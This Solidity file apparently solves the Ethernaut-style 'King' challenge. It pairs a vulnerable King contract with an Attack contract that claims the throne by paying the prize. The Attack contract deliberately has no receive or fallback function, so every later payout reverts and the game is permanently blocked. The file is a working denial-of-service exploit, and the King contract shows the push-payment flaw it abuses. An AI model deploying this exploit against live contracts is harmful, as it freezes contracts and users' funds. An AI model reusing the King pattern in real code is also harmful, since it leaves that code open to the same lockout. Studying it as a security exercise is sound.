// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    // becoming the king and
    // purpousely not including fallback or receive 
    // to prevent anybody else also from becoming the king. evil! 
    King king;
    constructor(address payable _king) payable {
    king = King(_king);
    (bool ok, ) = _king.call{value:  king.prize()}("");
    require(ok, "Transfer failed");
   }
}

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}